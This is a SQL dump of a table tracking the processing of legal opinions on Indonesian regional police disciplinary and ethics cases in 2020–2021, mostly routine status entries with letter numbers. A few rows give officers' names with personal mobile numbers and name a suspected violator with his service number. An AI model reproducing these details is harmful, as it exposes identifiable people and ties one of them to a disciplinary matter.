CREATE TABLE `pendapat_saran_proses`  (
  `pendapat_saran_id` bigint UNSIGNED NOT NULL,
  `pendapat_saran_proses_tanggal` date NOT NULL,
  `pendapat_saran_proses_status` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `pendapat_saran_proses_deskripsi` longtext CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `operator` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of pendapat_saran_proses
-- ----------------------------
INSERT INTO `pendapat_saran_proses` VALUES (17, '2020-12-31', 'PSH SELESAI DIKIRIM', 'REKAP PSH TAHUN 2020<br>JUMLAH 126 PSH<br>DISIPLIN 68 PSH<br>KODE ETIK 57 PSH<br>TUNGGAKAN 1 PERKARA DISIPLIN', 'Administrator', '2021-01-06 11:20:09', '2021-01-06 11:20:09');
INSERT INTO `pendapat_saran_proses` VALUES (18, '2020-12-23', 'LAPORAN MASUK', 'Masih dalam proses Gelar Perkara dan penyusunan Pendapat dan Saran Hukum oleh Kasubbid Bankum AKBP SUMAEDI, S.H., M.H. (kontak person 085961437993)&nbsp;', 'Administrator', '2021-01-06 11:30:11', '2021-01-06 11:30:11');
INSERT INTO `pendapat_saran_proses` VALUES (20, '2020-12-23', 'LAPORAN MASUK', 'Masih dalam proses Gelar Perkara dan penyusunan Pendapat dan Saran Hukum oleh Kaur Kermalem AKP PURBO WAHONO&nbsp;(kontak person 081237313466)', 'Administrator', '2021-01-06 11:42:48', '2021-01-06 11:42:48');
INSERT INTO `pendapat_saran_proses` VALUES (20, '2021-01-15', 'PSH SELESAI DIKIRIM', 'PSH sudah selesai dan dikirim sesuai Surat Kapolda NTB Nomor: R/31/I/HUK.12.10./2021/Bidkum tanggal 15-01-2021', 'Administrator', '2021-02-01 11:15:49', '2021-02-01 11:15:49');
INSERT INTO `pendapat_saran_proses` VALUES (23, '2021-01-13', 'LAPORAN MASUK', 'Perkara dan penyusunan Pendapat dan Saran Hukum oleh Kasubbid Sunluhkum KOMPOL MUSA,S.H.,M.H. (kontak person 087754935053)<br>', 'Administrator', '2021-01-13 12:54:22', '2021-01-13 12:54:22');
INSERT INTO `pendapat_saran_proses` VALUES (23, '2021-01-13', 'MASIH DALAM PROSES', 'Pendapat dan Saran Hukum terduga pelanggar a.n.BRIPKA YANUAR KASIM NRP 82011085', 'Administrator', '2021-01-13 12:33:53', '2021-01-13 12:33:53');
INSERT INTO `pendapat_saran_proses` VALUES (26, '2020-11-18', 'PSH SELESAI DIKIRIM', 'PSH selesai dan dikirim sesuai Surat Nomor: R/93/II/HUK.12.10./2021/Bidkum, tanggal 8 Februari 2021', 'Administrator', '2021-02-09 11:55:51', '2021-02-09 11:55:51');
INSERT INTO `pendapat_saran_proses` VALUES (28, '2021-01-11', 'PSH SELESAI DIKIRIM', 'PSH selesai dan dikirim sesuai Surat Nomor: R/43/I/HUK.12.10./2021/Bidkum, tanggal 22 Januari 2021', 'Administrator', '2021-02-09 12:06:43', '2021-02-09 12:06:43');
INSERT INTO `pendapat_saran_proses` VALUES (30, '2021-02-17', 'PSH SELESAI DIKIRIM', 'PSH selesai dan dikirim sesuai Surat Nomor: R/137/HUK.12.10./2021/Bidkum, tanggal 26 Februari 2021', 'Administrator', '2021-03-08 11:22:58', '2021-03-08 11:22:58');
INSERT INTO `pendapat_saran_proses` VALUES (31, '2021-02-17', 'PSH SELESAI DIKIRIM', 'PSH selesai dan dikirim sesuai Surat Nomor: R/138/HUK.12.10./2021/Bidkum, tanggal 26 Februari 2021', 'Administrator', '2021-03-08 11:31:21', '2021-03-08 11:31:21');
INSERT INTO `pendapat_saran_proses` VALUES (32, '2021-02-11', 'PSH SELESAI DIKIRIM', 'PSH selesai dan dikirim sesuai Surat Nomor: R/164/II/HUK.12.10./2021/Bidkum, tanggal 26 Februari 2021', 'Administrator', '2021-03-08 11:48:39', '2021-03-08 11:48:39');
INSERT INTO `pendapat_saran_proses` VALUES (33, '2020-12-29', 'PSH SELESAI DIKIRIM', 'PSH selesai dan dikirim sesuai Surat Nomor: R/70/I/HUK.12.10./2021/Bidkum, tanggal 29 Januari 2021', 'Administrator', '2021-03-08 13:50:20', '2021-03-08 13:50:20');
INSERT INTO `pendapat_saran_proses` VALUES (34, '2021-02-17', 'PSH SELESAI DIKIRIM', 'PSH selesai dan dikirim sesuai Surat Nomor: R/177/III/HUK.12.10./2021/Bidkum, tanggal 4 Maret 2021', 'Administrator', '2021-03-09 11:39:02', '2021-03-09 11:39:02');
INSERT INTO `pendapat_saran_proses` VALUES (35, '2021-01-08', 'PSH SELESAI DIKIRIM', 'PSH selesai dan dikirim sesuai Surat Nomor: R/114/II/HUK.12.10./2021/Bidkum, tanggal 17 Februari 2021', 'Administrator', '2021-03-09 11:45:00', '2021-03-09 11:45:00');
INSERT INTO `pendapat_saran_proses` VALUES (36, '2020-12-29', 'LAPORAN MASUK', 'PSH DALAM PROSES PENGIRIMAN DENGAN NOMOR R/216/III/HUK.12.10./2021/Bidkum', 'Administrator', '2021-03-26 12:42:17', '2021-03-26 12:42:17');
INSERT INTO `pendapat_saran_proses` VALUES (37, '2021-03-03', 'MASIH DALAM PROSES', 'PSH MASIH DALAM PROSES PENGIRIMAN DENGAN NOMOR: R/21/III/HUK.12.10./2021/Bidkum', 'Administrator', '2021-03-26 12:46:35', '2021-03-26 12:46:35');
INSERT INTO `pendapat_saran_proses` VALUES (38, '2021-02-25', 'MASIH DALAM PROSES', 'PSH MASIH DALAM PROSESDPENGIRIMAN DENGAN NOMOR: R/197/III/HUK.12.10./2021/Bidkum', 'Administrator', '2021-03-26 12:51:36', '2021-03-26 12:51:36');
INSERT INTO `pendapat_saran_proses` VALUES (39, '2021-02-18', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR : R/286/IV/HUK.12.10./2021/Bidkum', 'Administrator', '2021-04-15 11:52:05', '2021-04-15 11:52:05');
INSERT INTO `pendapat_saran_proses` VALUES (40, '2021-02-23', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/285/IV/HUK.12.10./2021/Bidkum', 'Administrator', '2021-04-15 11:58:19', '2021-04-15 11:58:19');
INSERT INTO `pendapat_saran_proses` VALUES (41, '2021-03-25', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: 288/IV/HUK.12.10./2021/Bidkum', 'Administrator', '2021-04-15 12:12:04', '2021-04-15 12:12:04');
INSERT INTO `pendapat_saran_proses` VALUES (42, '2021-04-22', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: 349/V/HUK,.12.10./2021/Bidkum', 'Administrator', '2021-05-18 13:47:31', '2021-05-18 13:47:31');
INSERT INTO `pendapat_saran_proses` VALUES (43, '2021-04-26', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/350/V/HUK.12.10./2021/Bidkum', 'Administrator', '2021-05-18 13:50:56', '2021-05-18 13:50:56');
INSERT INTO `pendapat_saran_proses` VALUES (44, '2021-04-19', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/320/IV/HUK.12.10./2021./Bidkum', 'Administrator', '2021-05-18 13:56:42', '2021-05-18 13:56:42');
INSERT INTO `pendapat_saran_proses` VALUES (45, '2021-04-13', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/309/IV/HUK.12.10./2021/Bidkum', 'Administrator', '2021-05-18 14:02:12', '2021-05-18 14:02:12');
INSERT INTO `pendapat_saran_proses` VALUES (46, '2021-04-13', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/310/IV/HUK.12.10./2021/Bidkum', 'Administrator', '2021-05-18 14:05:46', '2021-05-18 14:05:46');
INSERT INTO `pendapat_saran_proses` VALUES (47, '2021-03-22', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/306/IV/HUK.12.10./2021/Bidkum', 'Administrator', '2021-05-18 14:09:32', '2021-05-18 14:09:32');
INSERT INTO `pendapat_saran_proses` VALUES (48, '2021-03-08', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/311/IV/HUK.12.10./2021/Bidkum', 'Administrator', '2021-05-18 14:14:24', '2021-05-18 14:14:24');
INSERT INTO `pendapat_saran_proses` VALUES (49, '2021-02-23', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/285/IV/HUK.12.10./2021/Bidkum', 'Administrator', '2021-05-18 14:20:31', '2021-05-18 14:20:31');
INSERT INTO `pendapat_saran_proses` VALUES (50, '2021-04-23', 'MASIH DALAM PROSES', 'PSH MASIH DALAM PROSES PENGIRIMAN', 'Administrator', '2021-05-18 14:24:37', '2021-05-18 14:24:37');
INSERT INTO `pendapat_saran_proses` VALUES (37, '2021-05-18', 'LAPORAN MASUK', 'PSH MASIH DALAM PROSES PENGIRIMAN DENGAN NOMOR: R/215/III/HUK.12.10./2021/Bidkum<br>', 'Administrator', '2021-05-18 14:30:31', '2021-05-18 14:30:31');
INSERT INTO `pendapat_saran_proses` VALUES (51, '2021-03-04', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/217/III/HUK.12.10./2021/Bidkum', 'Administrator', '2021-05-18 14:37:08', '2021-05-18 14:37:08');
INSERT INTO `pendapat_saran_proses` VALUES (52, '2021-02-07', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/290/IV/HUK.12.10./2021/Bidkum', 'Administrator', '2021-05-18 14:45:10', '2021-05-18 14:45:10');
INSERT INTO `pendapat_saran_proses` VALUES (53, '2021-04-23', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/260/III/HUK.12.10./2021/Bidkum', 'Administrator', '2021-05-21 12:19:42', '2021-05-21 12:19:42');
INSERT INTO `pendapat_saran_proses` VALUES (54, '2021-04-06', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/262/v/HUK.12.10./2021/Bidkum', 'Administrator', '2021-05-21 12:23:04', '2021-05-21 12:23:04');
INSERT INTO `pendapat_saran_proses` VALUES (55, '2021-04-06', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/262/v/HUK.12.10./2021/Bidkum', 'Administrator', '2021-05-21 12:23:10', '2021-05-21 12:23:10');
INSERT INTO `pendapat_saran_proses` VALUES (56, '2021-04-22', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/263/V/HUK.12.10./2021/Bidkum', 'Administrator', '2021-05-21 12:26:31', '2021-05-21 12:26:31');
INSERT INTO `pendapat_saran_proses` VALUES (57, '2021-06-11', 'MASIH DALAM PROSES', 'penyusunan Pendapat dan Saran Hukum masih dalam proses oleh Kasubbid Bankum.', 'Administrator', '2021-06-16 13:54:45', '2021-06-16 13:54:45');
INSERT INTO `pendapat_saran_proses` VALUES (58, '2021-05-19', 'MASIH DALAM PROSES', 'penyusunan Pendapat dan Saran Hukum masih dalam proses oleh MUHAMMAD ILHAM, S.H., M.H.', 'Administrator', '2021-06-16 13:59:43', '2021-06-16 13:59:43');
INSERT INTO `pendapat_saran_proses` VALUES (59, '2021-05-18', 'MASIH DALAM PROSES', 'penyusunan Pendapat dan Saran Hukum masih dalam proses oleh Kasubbid Bankum.', 'Administrator', '2021-06-16 14:03:45', '2021-06-16 14:03:45');
INSERT INTO `pendapat_saran_proses` VALUES (57, '2021-06-18', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-06-21 12:20:03', '2021-06-21 12:20:03');
INSERT INTO `pendapat_saran_proses` VALUES (57, '2021-06-21', 'LAPORAN MASUK', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/232/VI/HUK.12.10./2021/Bidkum, tanggal 18 Juni 2021<br>', 'Administrator', '2021-06-21 14:37:51', '2021-06-21 14:37:51');
INSERT INTO `pendapat_saran_proses` VALUES (60, '2021-06-14', 'LAPORAN MASUK', 'PSH DITERIMA BIDKUM POLDA NTB TANGGAL 22 JUNI 2021', 'Administrator', '2021-06-22 11:14:05', '2021-06-22 11:14:05');
INSERT INTO `pendapat_saran_proses` VALUES (61, '2021-06-16', 'LAPORAN MASUK', 'PSH DITERIMA BIDKUM POLDA NTB TANGGAL 22 JUNI 2021', 'Administrator', '2021-06-22 11:16:58', '2021-06-22 11:16:58');
INSERT INTO `pendapat_saran_proses` VALUES (62, '2021-06-14', 'MASIH DALAM PROSES', 'penyusunan Pendapat dan Saran Hukum masih dalam proses oleh PS. KAUR KERMALEM AKP PURBO WAHONO', 'Administrator', '2021-06-28 13:23:42', '2021-06-28 13:23:42');
INSERT INTO `pendapat_saran_proses` VALUES (60, '2021-06-28', 'MASIH DALAM PROSES', 'penyusunan Pendapat dan Saran Hukum masih dalam proses oleh PS. KAUR KERMALEM AKP PURBO WAHONO<br>', 'Administrator', '2021-06-28 13:25:01', '2021-06-28 13:25:01');
INSERT INTO `pendapat_saran_proses` VALUES (63, '2021-07-02', 'LAPORAN MASUK', 'LAPORAN MASUK - PSH DITERIMA BIDKUM POLDA NTB TANGGAL 6 JULI 2021', 'Administrator', '2021-07-08 11:01:17', '2021-07-08 11:01:17');
INSERT INTO `pendapat_saran_proses` VALUES (58, '2021-07-13', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR:&nbsp; 388/VII/HUK.12.10./2021/Bidkum', 'Administrator', '2021-07-13 14:11:11', '2021-07-13 14:11:11');
INSERT INTO `pendapat_saran_proses` VALUES (59, '2021-07-13', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/386/VII/HUK.12.10./2021/Bidkum<br>', 'Administrator', '2021-07-13 14:11:56', '2021-07-13 14:11:56');
INSERT INTO `pendapat_saran_proses` VALUES (64, '2021-07-01', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: r/378/VII/HUK.12.10./2021/Bidkum', 'Administrator', '2021-07-13 14:16:24', '2021-07-13 14:16:24');
INSERT INTO `pendapat_saran_proses` VALUES (61, '2021-07-13', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/337/VI/HUK.12.10./2021/Bidkum<br>', 'Administrator', '2021-07-13 14:17:26', '2021-07-13 14:17:26');
INSERT INTO `pendapat_saran_proses` VALUES (65, '2021-06-29', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/374/VII/HUK.12.10./2021/Bidkum', 'Administrator', '2021-07-13 14:21:47', '2021-07-13 14:21:47');
INSERT INTO `pendapat_saran_proses` VALUES (66, '2021-05-19', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: r/323/VI/HUK.12.10./2021/Bidkum', 'Administrator', '2021-07-13 14:25:37', '2021-07-13 14:25:37');
INSERT INTO `pendapat_saran_proses` VALUES (67, '2021-05-27', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/322/VI/HUK.12.10./2021/Bidkum', 'Administrator', '2021-07-13 14:29:41', '2021-07-13 14:29:41');
INSERT INTO `pendapat_saran_proses` VALUES (68, '2021-04-29', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/345/VII/HUK.12.10./2021/Bidkum', 'Administrator', '2021-07-13 14:32:50', '2021-07-13 14:32:50');
INSERT INTO `pendapat_saran_proses` VALUES (69, '2021-07-15', 'LAPORAN MASUK', 'PSH DITERIMA BIDKUM POLDA NTB TANGGAL 21 JULI 2021', 'Administrator', '2021-07-21 11:51:26', '2021-07-21 11:51:26');
INSERT INTO `pendapat_saran_proses` VALUES (70, '2021-06-14', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/393/VII/HUK.12.10./2021/Bidkum, Tanggal 14 Juli 2021.', 'Administrator', '2021-08-18 10:55:22', '2021-08-18 10:55:22');
INSERT INTO `pendapat_saran_proses` VALUES (71, '2021-06-30', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/398/VII/HUK.12.10./2021/Bidkum', 'Administrator', '2021-08-18 11:04:00', '2021-08-18 11:04:00');
INSERT INTO `pendapat_saran_proses` VALUES (72, '2021-06-10', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR : R/396/VII/HUK.12.10./2021/Bidkum', 'Administrator', '2021-08-18 11:10:27', '2021-08-18 11:10:27');
INSERT INTO `pendapat_saran_proses` VALUES (73, '2021-06-11', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/387/ViI/HUK.12.10./2021/Bidkum', 'Administrator', '2021-08-18 11:22:36', '2021-08-18 11:22:36');
INSERT INTO `pendapat_saran_proses` VALUES (74, '2021-07-09', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/452/VIII/HUK.12.10./2021/Bidkum', 'Administrator', '2021-08-18 14:49:47', '2021-08-18 14:49:47');
INSERT INTO `pendapat_saran_proses` VALUES (75, '2021-07-15', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/445/VIII/HUK.12.10./2021/Bidkum', 'Administrator', '2021-08-18 14:52:51', '2021-08-18 14:52:51');
INSERT INTO `pendapat_saran_proses` VALUES (76, '2021-07-13', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/440/VIII/HUK.12.10./2021/Bidkum', 'Administrator', '2021-08-18 14:56:29', '2021-08-18 14:56:29');
INSERT INTO `pendapat_saran_proses` VALUES (77, '2021-07-02', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/401/VIII/HUK.12.10./2021/Bidkum', 'Administrator', '2021-08-18 15:00:27', '2021-08-18 15:00:27');
INSERT INTO `pendapat_saran_proses` VALUES (78, '2021-06-08', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/334/VI/HUK.12.10./2021/Bidkum', 'Administrator', '2021-08-18 15:03:56', '2021-08-18 15:03:56');
INSERT INTO `pendapat_saran_proses` VALUES (79, '2021-05-11', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR R/275/V/HUK.12.10./2021/Bidkum', 'Administrator', '2021-09-28 10:51:34', '2021-09-28 10:51:34');
INSERT INTO `pendapat_saran_proses` VALUES (80, '2020-11-18', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/93/II/HUK.12.10./2021/Bidkum', 'Administrator', '2021-09-28 10:57:11', '2021-09-28 10:57:11');
INSERT INTO `pendapat_saran_proses` VALUES (81, '2021-07-30', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/448/VIII/HUK.12.10./2021/Bidkum', 'Administrator', '2021-09-28 11:27:15', '2021-09-28 11:27:15');
INSERT INTO `pendapat_saran_proses` VALUES (69, '2021-08-06', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR R/445/VIII/HUK.12.10./2021/Bidkum', 'Administrator', '2021-09-28 11:30:01', '2021-09-28 11:30:01');
INSERT INTO `pendapat_saran_proses` VALUES (82, '2021-10-27', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/628/X/HUK.12.10./2021/Bidkum, Tanggal 29 Oktober 2021', 'Administrator', '2021-11-04 11:03:03', '2021-11-04 11:03:03');
INSERT INTO `pendapat_saran_proses` VALUES (83, '2021-09-23', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/602/X/HUK.12.10./2021/Bidkum', 'Administrator', '2021-11-23 12:55:05', '2021-11-23 12:55:05');
INSERT INTO `pendapat_saran_proses` VALUES (84, '2021-09-17', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/558/IX/12.10./2021/Bidkum', 'Administrator', '2021-11-23 12:59:42', '2021-11-23 12:59:42');
INSERT INTO `pendapat_saran_proses` VALUES (85, '2021-10-05', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/603/X/HUK.12.10./2021/Bidkum', 'Administrator', '2021-11-23 13:03:27', '2021-11-23 13:03:27');
INSERT INTO `pendapat_saran_proses` VALUES (86, '2021-10-07', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/624/X/HUK.12.10./2021/Bidkum', 'Administrator', '2021-11-23 13:06:45', '2021-11-23 13:06:45');
INSERT INTO `pendapat_saran_proses` VALUES (87, '2021-09-20', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/561/X/HUK.12.10./2021/Bidkum', 'Administrator', '2021-11-23 13:09:30', '2021-11-23 13:09:30');
INSERT INTO `pendapat_saran_proses` VALUES (88, '2021-09-03', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/594/X/HUK.12.10./2021/Bidkum', 'Administrator', '2021-11-23 13:12:16', '2021-11-23 13:12:16');
INSERT INTO `pendapat_saran_proses` VALUES (89, '2021-10-04', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/633/X/HUK.12.10./2021/Bidkum', 'Administrator', '2021-11-23 13:15:56', '2021-11-23 13:15:56');
INSERT INTO `pendapat_saran_proses` VALUES (90, '2021-10-19', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/629/X/HUK.12.10./2021/Bidkum', 'Administrator', '2021-11-23 13:19:48', '2021-11-23 13:19:48');
INSERT INTO `pendapat_saran_proses` VALUES (91, '2021-09-28', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRM DENGAN NOMOR: R/616/X/HUK.12.10./2021/Bidkum', 'Administrator', '2021-11-23 13:22:59', '2021-11-23 13:22:59');
INSERT INTO `pendapat_saran_proses` VALUES (92, '2021-10-07', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/685/XI/HUK.12.10./2021/Bidkum', 'Administrator', '2021-11-23 13:26:37', '2021-11-23 13:26:37');
INSERT INTO `pendapat_saran_proses` VALUES (93, '2021-11-05', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/680/XI/HUK.12.10./2021/Bidkum', 'Administrator', '2021-11-23 13:30:07', '2021-11-23 13:30:07');
INSERT INTO `pendapat_saran_proses` VALUES (94, '2021-11-04', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM DENGAN NOMOR: R/679/XI/HUK.12.10/Bidkum', 'Administrator', '2021-11-23 13:34:03', '2021-11-23 13:34:03');
INSERT INTO `pendapat_saran_proses` VALUES (95, '2020-11-23', 'PSH SELESAI DIKIRIM', 'PSH&nbsp; SELESAI DIKIRM', 'Administrator', '2021-12-13 11:53:06', '2021-12-13 11:53:06');
INSERT INTO `pendapat_saran_proses` VALUES (96, '2021-03-04', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-13 11:57:37', '2021-12-13 11:57:37');
INSERT INTO `pendapat_saran_proses` VALUES (97, '2021-03-08', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-13 12:00:51', '2021-12-13 12:00:51');
INSERT INTO `pendapat_saran_proses` VALUES (98, '2021-05-21', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-13 12:05:37', '2021-12-13 12:05:37');
INSERT INTO `pendapat_saran_proses` VALUES (99, '2021-04-22', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-13 12:08:25', '2021-12-13 12:08:25');
INSERT INTO `pendapat_saran_proses` VALUES (100, '2021-05-26', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-13 12:13:15', '2021-12-13 12:13:15');
INSERT INTO `pendapat_saran_proses` VALUES (101, '2021-08-18', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-13 12:20:03', '2021-12-13 12:20:03');
INSERT INTO `pendapat_saran_proses` VALUES (102, '2021-08-19', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-13 12:36:22', '2021-12-13 12:36:22');
INSERT INTO `pendapat_saran_proses` VALUES (103, '2021-07-28', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-13 12:41:25', '2021-12-13 12:41:25');
INSERT INTO `pendapat_saran_proses` VALUES (104, '2021-08-04', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-20 10:45:47', '2021-12-20 10:45:47');
INSERT INTO `pendapat_saran_proses` VALUES (105, '2021-07-28', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-20 11:59:23', '2021-12-20 11:59:23');
INSERT INTO `pendapat_saran_proses` VALUES (106, '2021-08-19', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-20 12:03:39', '2021-12-20 12:03:39');
INSERT INTO `pendapat_saran_proses` VALUES (107, '2021-08-18', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-20 12:06:38', '2021-12-20 12:06:38');
INSERT INTO `pendapat_saran_proses` VALUES (108, '2021-07-28', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-20 12:11:05', '2021-12-20 12:11:05');
INSERT INTO `pendapat_saran_proses` VALUES (109, '2021-09-20', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-20 12:13:48', '2021-12-20 12:13:48');
INSERT INTO `pendapat_saran_proses` VALUES (110, '2021-09-09', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-20 12:17:08', '2021-12-20 12:17:08');
INSERT INTO `pendapat_saran_proses` VALUES (111, '2021-09-16', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-20 12:20:51', '2021-12-20 12:20:51');
INSERT INTO `pendapat_saran_proses` VALUES (112, '2021-09-09', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-20 12:23:39', '2021-12-20 12:23:39');
INSERT INTO `pendapat_saran_proses` VALUES (113, '2021-08-25', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-20 12:27:11', '2021-12-20 12:27:11');
INSERT INTO `pendapat_saran_proses` VALUES (114, '2021-09-07', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-20 12:29:55', '2021-12-20 12:29:55');
INSERT INTO `pendapat_saran_proses` VALUES (115, '2021-10-27', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-20 12:33:57', '2021-12-20 12:33:57');
INSERT INTO `pendapat_saran_proses` VALUES (116, '2021-11-05', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM.', 'Administrator', '2021-12-21 11:22:25', '2021-12-21 11:22:25');
INSERT INTO `pendapat_saran_proses` VALUES (117, '2021-11-04', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-21 11:25:37', '2021-12-21 11:25:37');
INSERT INTO `pendapat_saran_proses` VALUES (118, '2021-11-06', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-22 11:26:09', '2021-12-22 11:26:09');
INSERT INTO `pendapat_saran_proses` VALUES (119, '2021-12-02', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-22 11:29:43', '2021-12-22 11:29:43');
INSERT INTO `pendapat_saran_proses` VALUES (120, '2021-12-08', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-23 13:03:05', '2021-12-23 13:03:05');
INSERT INTO `pendapat_saran_proses` VALUES (121, '2021-11-16', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-23 13:06:35', '2021-12-23 13:06:35');
INSERT INTO `pendapat_saran_proses` VALUES (122, '2021-11-03', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-23 13:08:35', '2021-12-23 13:08:35');
INSERT INTO `pendapat_saran_proses` VALUES (123, '2021-11-15', 'PSH SELESAI DIKIRIM', 'PSH SELESAI DIKIRIM', 'Administrator', '2021-12-23 13:11:54', '2021-12-23 13:11:54');
